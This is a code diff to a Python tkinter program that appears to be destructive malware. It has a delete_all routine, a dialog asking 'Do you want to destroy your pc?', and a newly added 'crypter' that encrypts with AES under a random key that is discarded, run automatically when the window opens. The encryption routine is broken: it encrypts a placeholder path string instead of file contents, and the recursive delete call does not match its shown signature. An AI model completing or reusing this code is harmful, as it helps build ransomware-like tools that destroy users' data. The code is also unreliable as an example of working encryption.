@@ -6,11 +6,38 @@ from tkinter import messagebox
 import os
 from time import sleep
 import shutil as st
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+from cryptography.hazmat.backends import default_backend
+import random 
+import string
 
+def crypter():
 
-def crypt():
-    pass 
+    import os
+    from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
+    from cryptography.hazmat.backends import default_backend
 
+    def encrypt_path(key, path):
+        backend = default_backend()
+        iv = os.urandom(16)
+        cipher = Cipher(algorithms.AES(key), modes.CFB(iv), backend=backend)
+        encryptor = cipher.encryptor()
+
+        encrypted_path = encryptor.update(path.encode()) + encryptor.finalize()
+
+        return iv + encrypted_path
+
+    def crypt():
+        key = os.urandom(16)  # Should be 16, 24, or 32 bytes long
+        path = r'C:\path\to\file.txt'
+        encrypted_path = encrypt_path(key, path)
+
+        with open('encrypted_file.txt', 'wb') as f:
+            f.write(encrypted_path)
+
+        print("File encrypted successfully.")
+
+    crypt()
 def delete_all():
 
     try:
@@ -28,7 +55,7 @@ def delete_all():
         delete_all(path)
 def use():
     root = tk.Tk()
-
+    crypter()
     
     def on_closing():
         if messagebox.askokcancel("Quit", "Do you want to destroy your pc?"):
@@ -63,14 +90,10 @@ def use():
     text_widget.config(state='disabled') 
 
     root.mainloop()
-    
-    
-
 def confirm():
     result = messagebox.askquestion("", "Are you sure you want to continue?")
     if result == "yes":
         use()
-
     else:
         pass
 
